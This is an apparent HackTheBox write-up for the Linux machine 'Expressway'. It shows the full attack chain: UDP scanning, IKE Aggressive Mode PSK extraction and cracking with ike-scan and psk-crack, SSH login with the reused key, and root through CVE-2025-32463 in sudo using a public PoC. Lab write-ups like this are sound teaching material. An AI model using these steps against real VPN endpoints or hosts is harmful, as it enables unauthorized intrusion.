---
title: "Expressway - HackTheBox Writeup"
date: 2026-03-06 00:00:00 +0000
categories: [boxes]
tags: [hackthebox, linux, ipsec, cve-2025-32463, sudo, privilege-escalation, easy]
image:
  path: /assets/img/box/5/logo.png
  alt: Expressway HackTheBox Machine
---

![Machine Info](https://img.shields.io/badge/Difficulty-Easy-green) ![Machine Info](https://img.shields.io/badge/OS-Linux-blue)

---

**Difficulty:** Easy  
**OS:** Linux  
**Author:** al3xx

---

## Table of Contents

- [Overview](#overview)
- [Executive Summary](#executive-summary)
- [Reconnaissance](#reconnaissance)
    - [TCP Port Scan](#tcp-port-scan)
    - [UDP Port Scan](#udp-port-scan)
- [IKE Enumeration](#ike-enumeration)
- [PSK Hash Extraction & Cracking](#psk-hash-extraction--cracking)
    - [Extracting the Hash](#extracting-the-hash)
    - [Cracking with psk-crack](#cracking-with-psk-crack)
- [Initial Access](#initial-access)
- [Privilege Escalation](#privilege-escalation)
    - [Sudo Version Check](#sudo-version-check)
    - [Exploitation](#exploitation)
- [Conclusion](#conclusion)
- [Remediation Recommendations](#remediation-recommendations)

---

## Overview

Expressway is an Easy-difficulty Linux machine from HackTheBox that demonstrates the security risks of improperly configured VPN services and outdated system components. The machine exposes an IPsec/IKE VPN service using Aggressive Mode, which allows attackers to capture and crack Pre-Shared Keys (PSK). Post-exploitation reveals a vulnerable sudo version that provides a direct path to root access.

---

## Executive Summary

Expressway is a Linux machine running an IPsec/IKE VPN service exposed on UDP port 500. By leveraging IKE Aggressive Mode, it's possible to extract a Pre-Shared Key (PSK) hash, crack it offline, and use the recovered credentials to log in via SSH. Once on the machine, a vulnerable version of `sudo` (CVE-2025-32463) provides a straightforward path to root.

---

## Reconnaissance

### TCP Port Scan

Starting with a standard Nmap scan to identify open TCP ports and running services:

```bash
nmap -sC -sV 10.129.238.52
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Only SSH was exposed on TCP. A full port scan confirmed no additional TCP services were running.

```bash
nmap -p- 10.129.238.52
```

> Same result — only port 22.

### UDP Port Scan

Since TCP didn't reveal much, pivoting to UDP scanning revealed something interesting:

```bash
nmap -sU 10.129.238.52
```

```
PORT    STATE SERVICE
500/udp open  isakmp
```

**Port 500/UDP** is running **ISAKMP** — the Internet Security Association and Key Management Protocol — which is the handshake layer of IPsec VPNs. Before an encrypted tunnel is established, ISAKMP negotiates:

- The encryption algorithm to use
- The hashing algorithm
- How each peer will authenticate

This is a critical finding as IKE/ISAKMP services can sometimes leak sensitive information during the handshake process.

---

## IKE Enumeration

Using `ike-scan` to probe the IKE service in **Aggressive Mode**:

```bash
ike-scan -M -A 10.129.238.52
```

| Flag | Description |
|------|-------------|
| `-M` | Multi-line output for readability |
| `-A` | Use IKE Aggressive Mode |

```
10.129.238.52   Aggressive Mode Handshake returned
    SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
    ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
    VID=09002689dfd6b712 (XAUTH)
    VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
```

Key findings:

- Authentication method: **PSK (Pre-Shared Key)**
- Identity: `ike@expressway.htb`
- Domain hint: `expressway.htb`

Since Aggressive Mode sends the PSK hash in plaintext before authentication is complete, we can capture and crack it. This is a well-known vulnerability in IKE Aggressive Mode configurations.

---

## PSK Hash Extraction & Cracking

### Extracting the Hash

Using `ike-scan` with the `--pskcrack` flag to extract the PSK hash in a crackable format:

```bash
ike-scan -M -A 10.129.238.52 --pskcrack
```

This outputs the IKE PSK parameters in a format suitable for offline cracking. The hash was saved to `ike.hash`.

### Cracking with psk-crack

Using the `psk-crack` tool with the rockyou.txt wordlist:

```bash
psk-crack -d rockyou.txt ike.hash
```

```
key "freakingrockstarontheroad" matches SHA1 hash aafebb18c1b377e654f108b09caa677ea92b681b
```

**Recovered PSK:** `freakingrockstarontheroad`

---

## Initial Access

With the cracked PSK and the identity `ike` (extracted from `ike@expressway.htb`), attempting SSH login:

```bash
ssh ike@10.129.238.52
```

When prompted for a password, using the cracked PSK: `freakingrockstarontheroad`

```
ike@expressway:~$ whoami
ike
```

Initial foothold established as user `ike`. The PSK was reused as the SSH password, which is a common misconfiguration in VPN deployments.

---

## Privilege Escalation

### Sudo Version Check

Checking the installed sudo version:

```bash
sudo -V
```

```
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
```

Sudo 1.9.17 is vulnerable to **CVE-2025-32463**, a local privilege escalation flaw that allows an unprivileged user to gain root access under certain conditions.

![CVE-2025-32463 PoC](/assets/img/box/5/poc.png)

### Exploitation

The exploit was downloaded from the [public PoC repository](https://github.com/kh4sh3i/CVE-2025-32463/) and executed:

```bash
ike@expressway:~$ bash exploit.sh
woot!
root@expressway:/# whoami
root
```

Root access achieved successfully.

```bash
root@expressway:/# cat /root/root.txt
[FLAG CONTENT]
```

